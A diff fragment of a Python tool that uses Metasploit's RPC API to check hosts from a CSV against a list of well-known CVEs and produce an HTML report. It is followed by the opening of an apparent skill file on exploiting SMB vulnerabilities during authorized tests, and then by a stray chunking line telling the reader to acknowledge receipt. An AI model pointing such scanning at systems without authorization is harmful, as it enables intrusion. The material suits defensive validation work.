+    python process.py validate --vulns vulns.csv --msf-host 127.0.0.1 --msf-pass password
+    python process.py report --results validation_results.csv
+"""
+
+import argparse
+import json
+import sys
+import time
+from datetime import datetime
+
+import pandas as pd
+import requests
+
+
+class MetasploitRPC:
+    """Interface to Metasploit RPC API for automated vulnerability validation."""
+
+    def __init__(self, host: str = "127.0.0.1", port: int = 55553,
+                 username: str = "msf", password: str = "password",
+                 ssl: bool = True):
+        self.base_url = f"{'https' if ssl else 'http'}://{host}:{port}/api/"
+        self.token = None
+        self.session = requests.Session()
+        self.session.verify = False
+
+        # Authenticate
+        self._login(username, password)
+
+    def _login(self, username: str, password: str):
+        """Authenticate to msfrpcd."""
+        result = self._call("auth.login", [username, password])
+        if result.get("result") == "success":
+            self.token = result["token"]
+            print(f"[+] Authenticated to Metasploit RPC")
+        else:
+            raise ConnectionError(f"Metasploit RPC auth failed: {result}")
+
+    def _call(self, method: str, params: list = None) -> dict:
+        """Make an RPC call to Metasploit."""
+        payload = json.dumps({
+            "jsonrpc": "2.0",
+            "method": method,
+            "id": 1,
+            "params": [self.token] + (params or []) if self.token else (params or [])
+        })
+
+        try:
+            response = self.session.post(
+                self.base_url, data=payload,
+                headers={"Content-Type": "application/json"},
+                timeout=60
+            )
+            return response.json().get("result", response.json())
+        except Exception as e:
+            return {"error": str(e)}
+
+    def create_console(self) -> str:
+        """Create a new Metasploit console."""
+        result = self._call("console.create")
+        console_id = result.get("id")
+        print(f"[+] Console created: {console_id}")
+        return console_id
+
+    def console_write(self, console_id: str, command: str):
+        """Write a command to a console."""
+        self._call("console.write", [console_id, command + "\n"])
+
+    def console_read(self, console_id: str, timeout: int = 30) -> str:
+        """Read output from a console with polling."""
+        output = ""
+        start = time.time()
+        while time.time() - start < timeout:
+            result = self._call("console.read", [console_id])
+            data = result.get("data", "")
+            output += data
+            if not result.get("busy", True):
+                break
+            time.sleep(2)
+        return output
+
+    def run_check(self, console_id: str, module: str, rhosts: str,
+                  options: dict = None) -> dict:
+        """Run a module check command and return results."""
+        self.console_write(console_id, f"use {module}")
+        time.sleep(1)
+        self.console_read(console_id, timeout=5)
+
+        self.console_write(console_id, f"set RHOSTS {rhosts}")
+        time.sleep(0.5)
+
+        if options:
+            for key, value in options.items():
+                self.console_write(console_id, f"set {key} {value}")
+                time.sleep(0.5)
+
+        self.console_read(console_id, timeout=5)
+        self.console_write(console_id, "check")
+        output = self.console_read(console_id, timeout=60)
+
+        is_vulnerable = any(
+            indicator in output.lower()
+            for indicator in ["is vulnerable", "appears vulnerable", "[+]"]
+        )
+        is_not_vulnerable = any(
+            indicator in output.lower()
+            for indicator in ["not vulnerable", "does not appear", "safe"]
+        )
+
+        status = "unknown"
+        if is_vulnerable and not is_not_vulnerable:
+            status = "vulnerable"
+        elif is_not_vulnerable:
+            status = "not_vulnerable"
+        elif "check is not supported" in output.lower():
+            status = "check_unsupported"
+
+        return {
+            "module": module,
+            "target": rhosts,
+            "status": status,
+            "output": output[:2000],
+            "timestamp": datetime.now().isoformat(),
+        }
+
+    def search_module(self, console_id: str, search_term: str) -> list:
+        """Search for Metasploit modules."""
+        self.console_write(console_id, f"search {search_term}")
+        output = self.console_read(console_id, timeout=30)
+
+        modules = []
+        for line in output.split("\n"):
+            if line.strip().startswith(("exploit/", "auxiliary/")):
+                parts = line.strip().split()
+                if len(parts) >= 3:
+                    modules.append({
+                        "module": parts[0],
+                        "date": parts[1],
+                        "rank": parts[2] if len(parts) > 2 else "",
+                        "description": " ".join(parts[3:]) if len(parts) > 3 else "",
+                    })
+        return modules
+
+    def destroy_console(self, console_id: str):
+        """Destroy a console."""
+        self._call("console.destroy", [console_id])
+
+
+class VulnerabilityValidator:
+    """Validate scanner findings using Metasploit check capabilities."""
+
+    # Map common CVEs to Metasploit modules
+    CVE_MODULE_MAP = {
+        "CVE-2017-0144": "exploit/windows/smb/ms17_010_eternalblue",
+        "CVE-2019-0708": "exploit/windows/rdp/cve_2019_0708_bluekeep_rce",
+        "CVE-2020-1472": "exploit/windows/dcerpc/cve_2020_1472_zerologon",
+        "CVE-2021-44228": "exploit/multi/http/log4shell_header_injection",
+        "CVE-2021-34527": "exploit/windows/dcerpc/cve_2021_1675_printnightmare",
+        "CVE-2022-26134": "exploit/multi/http/atlassian_confluence_namespace_ognl",
+        "CVE-2023-27997": "exploit/linux/http/fortinet_fortigate_sslvpn_rce",
+        "CVE-2024-3094": "auxiliary/scanner/ssh/xz_backdoor_scanner",
+        "CVE-2014-0160": "auxiliary/scanner/ssl/openssl_heartbleed",
+        "CVE-2014-6271": "exploit/multi/http/apache_mod_cgi_bash_env_exec",
+    }
+
+    # Map service/plugin families to auxiliary scanner modules
+    SERVICE_SCANNER_MAP = {
+        "smb": "auxiliary/scanner/smb/smb_ms17_010",
+        "rdp": "auxiliary/scanner/rdp/cve_2019_0708_bluekeep",
+        "ssl_heartbleed": "auxiliary/scanner/ssl/openssl_heartbleed",
+        "http_dir_listing": "auxiliary/scanner/http/dir_listing",
+        "ftp_anonymous": "auxiliary/scanner/ftp/anonymous",
+        "ssh_enumusers": "auxiliary/scanner/ssh/ssh_enumusers",
+        "mssql_login": "auxiliary/scanner/mssql/mssql_login",
+    }
+
+    def __init__(self):
+        self.results = []
+
+    def find_module(self, cve: str) -> str:
+        """Find the best Metasploit module for a given CVE."""
+        return self.CVE_MODULE_MAP.get(cve, "")
+
+    def validate_from_csv(self, csv_path: str, msf: MetasploitRPC) -> pd.DataFrame:
+        """Validate vulnerabilities from a CSV file using Metasploit."""
+        df = pd.read_csv(csv_path)
+        console_id = msf.create_console()
+
+        try:
+            for _, row in df.iterrows():
+                cve = row.get("cve", "")
+                host = row.get("host", row.get("hostname", ""))
+                module = row.get("msf_module", self.find_module(cve))
+
+                if not module:
+                    self.results.append({
+                        "cve": cve, "host": host, "module": "",
+                        "status": "no_module", "output": "No Metasploit module mapped",
+                        "timestamp": datetime.now().isoformat(),
+                    })
+                    print(f"  [?] {cve} on {host}: No module available")
+                    continue
+
+                print(f"  [*] Checking {cve} on {host} with {module}...")
+                result = msf.run_check(console_id, module, host)
+                result["cve"] = cve
+                self.results.append(result)
+
+                status_icon = "[+]" if result["status"] == "vulnerable" else "[-]"
+                print(f"  {status_icon} {cve} on {host}: {result['status']}")
+
+        finally:
+            msf.destroy_console(console_id)
+
+        return pd.DataFrame(self.results)
+
+    def generate_report(self, output_path: str):
+        """Generate validation report."""
+        if not self.results:
+            print("[-] No results to report")
+            return
+
+        df = pd.DataFrame(self.results)
+        total = len(df)
+        confirmed = len(df[df["status"] == "vulnerable"])
+        not_vuln = len(df[df["status"] == "not_vulnerable"])
+        unknown = len(df[df["status"].isin(["unknown", "check_unsupported"])])
+        no_module = len(df[df["status"] == "no_module"])
+
+        html = f"""<!DOCTYPE html>
+<html>
+<head>
+    <title>Metasploit Validation Report</title>
+    <style>
+        body {{ font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }}
+        .header {{ background: #1a1a2e; color: white; padding: 20px; border-radius: 8px; }}
+        .metrics {{ display: flex; gap: 15px; margin: 20px 0; }}
+        .card {{ background: white; padding: 20px; border-radius: 8px; flex: 1; text-align: center;
+                 box-shadow: 0 2px 4px rgba(0,0,0,0.1); }}
+        .card h3 {{ margin: 0; font-size: 2em; }}
+        .confirmed {{ border-top: 4px solid #e74c3c; }}
+        .safe {{ border-top: 4px solid #27ae60; }}
+        .unknown {{ border-top: 4px solid #f39c12; }}
+        table {{ width: 100%; border-collapse: collapse; background: white; margin: 15px 0; }}
+        th {{ background: #2c3e50; color: white; padding: 10px; text-align: left; }}
+        td {{ padding: 8px; border-bottom: 1px solid #eee; }}
+        .status-vulnerable {{ color: #e74c3c; font-weight: bold; }}
+        .status-not_vulnerable {{ color: #27ae60; }}
+        .status-unknown {{ color: #f39c12; }}
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>Vulnerability Validation Report</h1>
+        <p>Tool: Metasploit Framework | Date: {datetime.now().strftime('%Y-%m-%d')}</p>
+    </div>
+    <div class="metrics">
+        <div class="card confirmed"><h3>{confirmed}</h3><p>Confirmed Vulnerable</p></div>
+        <div class="card safe"><h3>{not_vuln}</h3><p>Not Vulnerable</p></div>
+        <div class="card unknown"><h3>{unknown}</h3><p>Inconclusive</p></div>
+        <div class="card"><h3>{no_module}</h3><p>No Module Available</p></div>
+    </div>
+    <h2>Validation Results</h2>
+    <table>
+        <tr><th>CVE</th><th>Host</th><th>Module</th><th>Status</th></tr>
+        {''.join(f'<tr><td>{r.get("cve","")}</td><td>{r.get("target",r.get("host",""))}</td><td>{r.get("module","")}</td><td class="status-{r["status"]}">{r["status"]}</td></tr>' for r in self.results)}
+    </table>
+</body>
+</html>"""
+
+        with open(output_path, "w", encoding="utf-8") as f:
+            f.write(html)
+        print(f"[+] Report saved to: {output_path}")
+
+
+def main():
+    parser = argparse.ArgumentParser(description="Metasploit Vulnerability Validation")
+    subparsers = parser.add_subparsers(dest="command")
+
+    val_p = subparsers.add_parser("validate", help="Validate vulnerabilities with Metasploit")
+    val_p.add_argument("--vulns", required=True, help="CSV with cve, host columns")
+    val_p.add_argument("--msf-host", default="127.0.0.1", help="msfrpcd host")
+    val_p.add_argument("--msf-port", type=int, default=55553, help="msfrpcd port")
+    val_p.add_argument("--msf-user", default="msf", help="msfrpcd username")
+    val_p.add_argument("--msf-pass", required=True, help="msfrpcd password")
+    val_p.add_argument("--output", default="validation_results.csv")
+    val_p.add_argument("--report", default="validation_report.html")
+
+    args = parser.parse_args()
+
+    if args.command == "validate":
+        msf = MetasploitRPC(
+            host=args.msf_host, port=args.msf_port,
+            username=args.msf_user, password=args.msf_pass
+        )
+        validator = VulnerabilityValidator()
+        results_df = validator.validate_from_csv(args.vulns, msf)
+        results_df.to_csv(args.output, index=False)
+        print(f"[+] Results saved to: {args.output}")
+        validator.generate_report(args.report)
+
+    else:
+        parser.print_help()
+
+
+if __name__ == "__main__":
+    main()
+
+##### END FILE #####
+
+##### FILE: exploiting-smb-vulnerabilities-with-metasploit/SKILL.md #####
+---
+name: exploiting-smb-vulnerabilities-with-metasploit
+description: 'Identifies and exploits SMB protocol vulnerabilities using Metasploit
+  Framework during authorized penetration tests to demonstrate risks from unpatched
+  Windows systems, misconfigured shares, and weak authentication in enterprise networks.
+
+  '
+domain: cybersecurity
+subdomain: network-security
+tags:
+- network-security
+- smb
+- metasploit
+- exploitation
+- eternalblue
+version: '1.0'
+author: mahipal
+license: Apache-2.0
+nist_csf:
+- PR.IR-01
+- DE.CM-01
+- ID.AM-03
+- PR.DS-02
+mitre_attack:
+- T1046
+- T1040
+- T1557
+- T1071
+---
+# Exploiting SMB Vulnerabilities with Metasploit
+
+## When to Use
+
+- Testing Windows systems for critical SMB vulnerabilities (EternalBlue, EternalRomance, PrintNightmare) during authorized penetration tests
+- Demonstrating lateral movement risks via SMB relay, pass-the-hash, and credential spraying
+
+-----
+[END PART 9/14] — رد غير "Received part 9/14"
